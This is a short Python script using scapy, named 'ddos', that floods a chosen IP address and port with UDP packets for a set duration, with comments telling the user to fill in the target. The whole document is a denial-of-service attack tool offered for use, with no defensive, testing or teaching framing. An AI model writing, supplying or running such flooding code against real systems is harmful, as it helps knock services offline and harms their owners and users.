from scapy.all import IP, UDP, send

def ddos(target_ip, target_port, duration):
    # Create a UDP packet
    packet = IP(dst=target_ip) / UDP(dport=target_port)

    # Send packets for the specified duration
    end_time = time.time() + duration
    while time.time() < end_time:
        send(packet, verbose=0)

if __name__ == "__main__":
    import time

    # Target IP and port
    target_ip = "example.com"  # Replace with the target IP or domain
    target_port = 80  # Replace with the target port

    # Duration of the attack in seconds
    duration = 60  # 1 minute

    ddos(target_ip, target_port, duration)
